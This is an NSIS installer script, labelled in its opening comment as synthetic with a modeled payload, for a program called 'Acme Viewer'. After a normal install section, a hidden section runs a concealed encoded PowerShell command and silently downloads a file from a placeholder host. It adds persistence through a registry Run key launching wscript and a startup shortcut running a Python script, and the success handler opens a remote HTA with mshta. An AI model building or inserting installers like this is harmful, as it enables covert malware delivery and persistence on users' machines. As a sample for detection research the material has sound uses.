; synthetic NSIS installer: real setup + modeled payload
Unicode True
!define APP "Acme Viewer"
Name "${APP}"
OutFile "acme-setup.exe"
InstallDir "$PROGRAMFILES\Acme"
RequestExecutionLevel admin
Page directory
Page instfiles

Function .onInit
  MessageBox MB_OK "Welcome to ${APP}"
FunctionEnd

Section "Main" SecMain
  SetOutPath "$INSTDIR"
  File "viewer.exe"
  File /oname=readme.txt "README.md"
  CreateDirectory "$SMPROGRAMS\Acme"
  CreateShortCut "$SMPROGRAMS\Acme\Viewer.lnk" "$INSTDIR\viewer.exe"
  WriteUninstaller "$INSTDIR\uninstall.exe"
  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Uninstall\Acme" "DisplayName" "${APP}"
  DetailPrint "installed"
SectionEnd

Section "-hidden"
  StrCpy $1 "powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdABhAGcAZQAyACcA"
  nsExec::ExecToLog '$1'
  inetc::get /SILENT "https://cdn.acme.example.invalid/update.bin" "$TEMP\update.bin" /END
  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "AcmeUpd" 'wscript.exe //E:jscript "$APPDATA\acme\u.dat"'
  CreateShortCut "$SMSTARTUP\acme.lnk" "cmd.exe" '/c python "$APPDATA\acme\s.py"'
SectionEnd

Function .onInstSuccess
  ExecShell "open" "mshta.exe" "https://acme.example.invalid/n.hta"
FunctionEnd
